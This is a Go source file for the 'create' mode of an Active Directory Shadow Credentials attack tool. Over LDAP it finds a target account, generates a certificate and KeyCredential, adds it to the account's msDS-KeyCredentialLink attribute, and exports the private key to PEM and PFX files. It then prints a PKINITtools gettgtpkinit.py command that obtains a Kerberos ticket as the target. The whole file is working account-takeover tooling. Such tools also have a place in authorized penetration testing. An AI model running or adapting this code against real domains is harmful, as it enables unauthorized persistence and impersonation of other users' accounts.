package mode_create

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"time"

	"github.com/TheManticoreProject/Manticore/logger"
	"github.com/TheManticoreProject/Manticore/network/ldap"
	"github.com/TheManticoreProject/Manticore/utils"
	"github.com/TheManticoreProject/Manticore/windows/keycredential"
	"github.com/TheManticoreProject/Manticore/windows/keycredential/crypto"
	keycredential_utils "github.com/TheManticoreProject/Manticore/windows/keycredential/utils"
	"github.com/TheManticoreProject/Manticore/windows/keycredential/version"
	"github.com/TheManticoreProject/ShadowCredentials/config"

	"github.com/TheManticoreProject/Manticore/windows/guid"
)

// Run creates a new KeyCredentialLink and exports it to PEM, PFX, and binary formats.
//
// Parameters:
// - owner: The owner of the KeyCredential.
// - identifier: The identifier of the KeyCredential.
// - creationTime: The creation time of the KeyCredential.
// - lastLogonTime: The last logon time of the KeyCredential.
// - notBefore: The notBefore time of the KeyCredential.
// - notAfter: The notAfter time of the KeyCredential.
// - deviceId: The device ID of the KeyCredential.
// - keySize: The key size of the KeyCredential.
// - exportPem: Whether to export the KeyCredential to PEM format.
// - exportPfx: Whether to export the KeyCredential to PFX format.
// - config: The configuration of the application.
//
// Returns:
// - An error if the operation fails.
// - nil if the operation succeeds.
func Run(distinguishedName, identifier, creationTime, lastLogonTime, notBefore, notAfter, deviceId string, keySize int, exportPem, exportPfx bool, config config.Config) error {
	if config.Debug {
		logger.Debug("Starting mode 'create'")
	}

	// Time to add the keycredential to the user
	ldapSession := ldap.Session{}
	ldapSession.InitSession(
		config.Network.DomainController,
		config.Network.LDAP.LDAPPort,
		config.Credentials,
		config.Network.LDAP.UseLdaps,
		false,
	)
	connected, err := ldapSession.Connect()
	if err != nil {
		return fmt.Errorf("error connecting to LDAP server: %s", err)
	}
	if connected {
		if config.Debug {
			if config.Network.LDAP.UseLdaps {
				logger.Debug(fmt.Sprintf("Connected as '%s\\%s' on ldaps://%s:%d", config.Network.Domain, config.Credentials.Username, config.Network.DomainController, config.Network.LDAP.LDAPPort))
			} else {
				logger.Debug(fmt.Sprintf("Connected as '%s\\%s' on ldap://%s:%d", config.Network.Domain, config.Credentials.Username, config.Network.DomainController, config.Network.LDAP.LDAPPort))
			}
		}

		logger.Info(fmt.Sprintf("Searching for target object: %s", distinguishedName))
		query := fmt.Sprintf("(distinguishedName=%s)", distinguishedName)

		attributes := []string{"distinguishedName", "msDS-KeyCredentialLink", "sAMAccountName"}
		ldapResults, err := ldapSession.QueryWholeSubtree("", query, attributes)
		if err != nil {
			return fmt.Errorf("error querying LDAP server: %s", err)
		}

		if config.Debug {
			logger.Debug(fmt.Sprintf("Found %d objects with distinguishedName: %s", len(ldapResults), distinguishedName))
			for _, entry := range ldapResults {
				logger.Debug(fmt.Sprintf(" | %s", entry.GetAttributeValue("distinguishedName")))
			}
		}

		if len(ldapResults) == 0 {
			logger.Warn(fmt.Sprintf("No objects with distinguishedName '%s' found.", distinguishedName))
			return fmt.Errorf("no objects with distinguishedName '%s' found", distinguishedName)
		}

		if len(ldapResults) > 1 {
			logger.Warn(fmt.Sprintf("Too many objects with distinguishedName '%s' found (%d).", distinguishedName, len(ldapResults)))
			return fmt.Errorf("too many objects with distinguishedName '%s' found (%d)", distinguishedName, len(ldapResults))
		}

		logger.Info(fmt.Sprintf("Target object currently has %d msDS-KeyCredentialLink values", len(ldapResults[0].GetAttributeValues("msDS-KeyCredentialLink"))))

		// Prepare time values
		notBeforeTime, err := utils.TimeStringToTime(notBefore)
		if err != nil {
			return fmt.Errorf("error parsing notBefore: %s", err)
		}
		// Set notAfter to 1 year from notBefore if not specified
		notAfterTime := notBeforeTime.Add(time.Hour * 24 * 365 * 1)
		if len(notAfter) > 0 {
			notAfterTimePtr, err := utils.TimeStringToTime(notAfter)
			if err != nil {
				return fmt.Errorf("error parsing notAfter: %s", err)
			}
			notAfterTime = *notAfterTimePtr
		}
		// Set key size to 2048 if not specified
		if keySize == 0 {
			if config.Debug {
				logger.Debug("Key size set to 0, using default of 2048bits")
			}
			keySize = 2048
		}

		sAMAccountName := ldapResults[0].GetAttributeValue("sAMAccountName")

		logger.Info("Creating new X509Certificate")
		cert, err := crypto.NewX509Certificate(sAMAccountName, keySize, *notBeforeTime, notAfterTime)
		if err != nil {
			return fmt.Errorf("error creating X509Certificate: %s", err)
		}

		// Prepare values for the KeyCredential
		keyVersion := version.KeyCredentialVersion{Value: version.KeyCredentialVersion_2}

		if len(identifier) == 0 {
			randomBytes := make([]byte, 32)
			_, err := rand.Read(randomBytes)
			if err != nil {
				return fmt.Errorf("error generating random bytes for identifier: %s", err)
			}
			identifier = base64.StdEncoding.EncodeToString(randomBytes)
		} else {
			identifierBytes, err := base64.StdEncoding.DecodeString(identifier)
			if err != nil {
				return fmt.Errorf("error decoding identifier: %s", err)
			}
			if len(identifierBytes) != 32 {
				return fmt.Errorf("identifier must be 32 bytes data encoded in base64")
			}
		}

		creationDateTime := keycredential_utils.NewDateTimeFromTime(*notBeforeTime)

		lastLogonDateTime := keycredential_utils.NewDateTimeFromTime(*notBeforeTime)

		deviceIdGUID := guid.NewGUID()
		if len(deviceId) > 0 {
			deviceIdGUID, err = guid.FromString(deviceId)
			if err != nil {
				return fmt.Errorf("error parsing deviceId: %s", err)
			}
		}

		if config.Debug {
			logger.Debug(fmt.Sprintf("KeyCredentialVersion: %s", keyVersion.String()))
			logger.Debug(fmt.Sprintf("Identifier: %s", identifier))
			logger.Debug(fmt.Sprintf("CreationTime: %s", creationDateTime.String()))
			logger.Debug(fmt.Sprintf("LastLogonTime: %s", lastLogonDateTime.String()))
			logger.Debug(fmt.Sprintf("DeviceId: %s", deviceIdGUID.ToFormatD()))
		}

		kc := keycredential.NewKeyCredential(
			keyVersion,
			identifier,
			cert.GetRSAKeyMaterial(),
			*deviceIdGUID,
			creationDateTime,
			lastLogonDateTime,
		)
		if config.Debug {
			kc.Describe(0)
		}

		rawBytes, err := kc.Marshal()
		if err != nil {
			fmt.Printf("[error] Error converting KeyCredential to raw bytes: %s\n", err)
		}
		dnWithBinary := ldap.DNWithBinary{DistinguishedName: distinguishedName, BinaryData: rawBytes}
		msDSKeyCredentialLinkValue := dnWithBinary.String()
		if config.Debug {
			logger.Debug(fmt.Sprintf("msDS-KeyCredentialLink: %s", msDSKeyCredentialLinkValue))
		}

		//
		err = ldapSession.AddStringToAttributeList(
			ldapResults[0].GetAttributeValue("distinguishedName"),
			"msDS-KeyCredentialLink",
			msDSKeyCredentialLinkValue,
		)

		if err != nil {
			logger.Warn(fmt.Sprintf("Error adding value to attribute: %s", err))
			return fmt.Errorf("error adding value to attribute: %s", err)
		} else {
			logger.Info("Successfully added a new KeyCredentialLink to the existing msDS-KeyCredentialLink value")

			// Export the certificate to PEM, PFX, and binary formats
			datePrefix := time.Now().Format("2006-01-02_15-04-05")

			// Export the PEM
			if exportPem {
				filePrivateKey := fmt.Sprintf("./keys/%s/%s.pem", datePrefix, utils.PathSafeString(distinguishedName))
				fileCertificatePem := fmt.Sprintf("./keys/%s/%s.cert.pem", datePrefix, utils.PathSafeString(distinguishedName))
				// Export the private key
				cert.ExportRSAPrivateKeyPEM(filePrivateKey)
				logger.Info(fmt.Sprintf(" | Saved PEM private key: %s", filePrivateKey))
				// Export the public key
				err = cert.ExportPFX(fileCertificatePem, "admin")
				if err != nil {
					return fmt.Errorf("error exporting PFX certificate: %s", err)
				}
				logger.Info(fmt.Sprintf(" | Saved PEM certificate: %s", fileCertificatePem))

				logger.Info("You can now get a TGT for this account using https://github.com/dirkjanm/PKINITtools with this command:")
				logger.Info(fmt.Sprintf("python3 gettgtpkinit.py -dc-ip '%s' -cert-pem '%s' -key-pem '%s' '%s/%s' '%s.ccache'", config.Network.DomainController, fileCertificatePem, filePrivateKey, config.Network.Domain, config.Credentials.Username, sAMAccountName))
			}

			// Export the PFX
			if exportPfx {
				pfxPassword := utils.RandomString(16)
				fileCertificatePFX := fmt.Sprintf("./keys/%s/%s_%s.pfx", datePrefix, utils.PathSafeString(distinguishedName), pfxPassword)

				cert.ExportPFX(fileCertificatePFX, pfxPassword)
				logger.Info(fmt.Sprintf(" | Saved PFX with password '%s': %s", pfxPassword, fileCertificatePFX))

				logger.Info("You can now get a TGT for this account using https://github.com/dirkjanm/PKINITtools with this command:")
				logger.Info(fmt.Sprintf("python3 gettgtpkinit.py -dc-ip '%s' -cert-pfx '%s' -pfx-pass '%s' '%s/%s' '%s.ccache'", config.Network.DomainController, fileCertificatePFX, pfxPassword, config.Network.Domain, config.Credentials.Username, sAMAccountName))
			}

		}
	} else {
		return fmt.Errorf("error connecting to LDAP server")
	}

	return nil
}
